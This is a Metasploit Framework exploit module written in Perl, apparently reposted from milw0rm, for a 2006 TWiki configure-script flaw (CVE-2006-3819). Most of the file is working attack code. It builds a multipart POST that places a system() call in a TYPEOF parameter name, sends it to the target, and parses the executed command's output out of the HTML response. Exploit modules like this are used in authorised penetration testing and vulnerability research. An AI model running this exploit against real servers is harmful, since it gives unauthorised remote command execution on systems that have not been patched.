##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::twiki_config_typeof;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;

my $advanced = {
	'HttpBoundary' => ['Mtb06z', 'HTTP boundary']
};

my $info = {
	'Name'     => 'Twiki Configure script TYPEOF Parameter Remote Command Execution',
	'Version'  => '$Revision: 1.0 $',
	'Authors'  => [ 'David Maciejak <david dot maciejak at gmail dot com>' ],
	'Arch'     => [ ],
	'OS'       => [ ],
	'Priv'     => 1,
	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'VHOST' => [0, 'DATA', 'The virtual host name of the server'],
		'DIR'   => [1, 'DATA', 'Directory of Twiki', '/twiki'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Description' => Pex::Text::Freeform(qq{
		This module exploits an arbitrary command execution vulnerability in the
	Twiki configure script. All versions of Twiki prior to
	4.0.4 hotfix 2 are vulnerable. Patch HotFix04x00x04x02 is available on twiki.org homepage.
}),
	'Refs' =>
	  [
		['BID', '19188'],
		['CVE', '2006-3819'],
		['OSVDB', '27556'],
	  ],

	'Payload' =>
	  {
		'Space' => 128,
		'Keys'  => ['cmd','cmd_bash'],
	  },

	'Keys' => ['twiki'],

	'DisclosureDate' => 'Jul 27 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host    = $self->VHost;
	my $target_port    = $self->GetVar('RPORT');
	my $dir            = $self->GetVar('DIR');
	my $encodedPayload = $self->GetVar('EncodedPayload');
	my $cmd            = $encodedPayload->RawPayload;
	my $boundary		 = $self->GetLocal('HttpBoundary');

	$cmd=
		"\r\n--".$boundary."\r\n".
		"Content-Disposition: form-data; name=\"action\"\r\n\r\n".
		"update\r\n".
		"--".$boundary.
		"Content-Disposition: form-data; name=\"TYPEOF:{system('$cmd')}\"\r\n\r\n".
		"BOOLEAN\r\n".
		"--".$boundary;

	my $proto="http";
	if ($self->GetVar('SSL'))
	{
		$proto.="s";
	}

	 my $request =
    	"POST ".$dir."/bin/configure HTTP/1.1\r\n".
		"Content-Type: multipart/form-data; boundary=".$boundary."\r\n".
		"User-Agent: Mozilla/4.76 [en] (X11; U; Linux 2.4.31-grsec i686)\r\n".
		"Host: $target_host\r\n".
		"Referer: ".$proto."://".$target_host.$dir."/bin/configure\r\n".
		"Accept: image/gif, image/x-xbitmap, image/jpeg, image/png\r\n".
		"Accept-Language: en\r\n".
		"Content-Length: ". length($cmd). "\r\n\r\n".
		$cmd;

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($request);

	my $results = $s->Recv(-1, 200);

	if ($results=~ /^transfer-encoding:[ \t]*chunked\b/im){
		my @extract_result;
		my @results = split ( /\r\n/, $results );

		chomp @results;
		my $fill_extract_result=0;
		my $end_break=0;
		my $i=0;
		while ( !$end_break && ($i < @results)){
			if ($results[$i] =~ /\<div id=\"patternScreen\"\>/)
			{
				$fill_extract_result=0;
				$end_break=1;
			}
			if ($fill_extract_result>0) {
					push(@extract_result,$results[$i]);
			}
			if ($results[$i] =~ /\<body class=\"patternNoViewPage\"\>/)
			{
				$fill_extract_result=1;
			}
			$i++;
		}

		if (@extract_result < 3) {
				$self->PrintLine("[*] Target may be not vulnerable, or you have used ';' char in CMD");
		}
		else {
			for ($i=1;$i<@extract_result;$i+=2) {
				chomp @extract_result;
				$self->PrintLine("$extract_result[$i]");
			}
		}
	}

	$s->Close();
	return;
}

sub VHost {
	my $self = shift;
	my $name = $self->GetVar('VHOST') || $self->GetVar('RHOST');
	return $name;
}

1;

# milw0rm.com [2006-08-02]